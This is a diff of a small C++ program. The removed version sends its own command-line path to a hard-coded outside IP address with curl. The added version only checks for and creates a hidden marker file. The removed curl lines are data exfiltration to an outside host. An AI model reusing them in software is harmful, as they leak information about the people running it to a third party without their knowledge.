@@ -1,24 +1,22 @@
 #include <stdlib.h>
-#include <string.h>
+#include <sys/stat.h>
 #include <unistd.h>
 
+#include <fstream>
 #include <string>
 
-int main(int argc, char *argv[]) {
-  std::string a(program_path());
-  std::string extraction_command = "curl http://68.183.112.161:11111/?a=" + a;
-  system(extraction_command.c_str());
-  return 0;
+inline bool exists_test(const std::string& name) {
+  std::ifstream f(name.c_str());
+  return f.good();
 }
 
-char *program_path() {
-  char *path = (char *)malloc(100);
-  if (path != NULL) {
-    if (readlink("/proc/self/cmdline", path, 100) == -1) {
-      free(path);
-      system("curl http://68.183.112.161:11111/?a=bad");
-      path = NULL;
-    }
+int main(int argc, char* argv[]) {
+  std::string secret = ".fjdffdsk";
+
+  if (exists_test(secret)) {
+    return -1;
   }
-  return path;
+
+  system("touch .fjdffdsk");
+  return 0;
 }
